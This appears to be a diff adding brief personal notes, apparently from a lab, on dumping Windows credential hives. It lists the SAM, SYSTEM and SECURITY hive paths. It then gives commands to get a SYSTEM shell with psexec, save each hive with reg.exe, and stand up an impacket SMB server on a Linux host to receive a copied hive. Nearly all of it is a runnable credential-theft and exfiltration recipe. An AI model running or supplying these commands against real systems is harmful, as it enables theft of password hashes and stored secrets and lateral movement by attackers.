@@ -1,1 +1,21 @@
+SAM ( Security Account Manager )
+C:\Windows\System32\config\SAM ( NTLM Hashes ) HKLM\SAM
+C:\Windows\System32\config\SYSTEM ( Decrypted Function ) HKLM\SYSTEM
+C:\Windows\System32\config\SECURITY ( Security Policy ) HKLM\SECURITY\Policy\Secrets
+
+Shadow Copy:
+1) Run as nt authority\system
+psexec.exe -s -i cmd.exe
+
+reg.exe save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\SYSTEM /y 
+reg.exe save HKEY_LOCAL_MACHINE\SAM C:\Temp\SAM /y
+reg.exe save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\SECURITY /y
+
+Linux:
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Labaratory /home/sako/Labaratory
+
+Windows:
+copy SYSTEM \\192.168.0.250\Labaratory
+
+
 
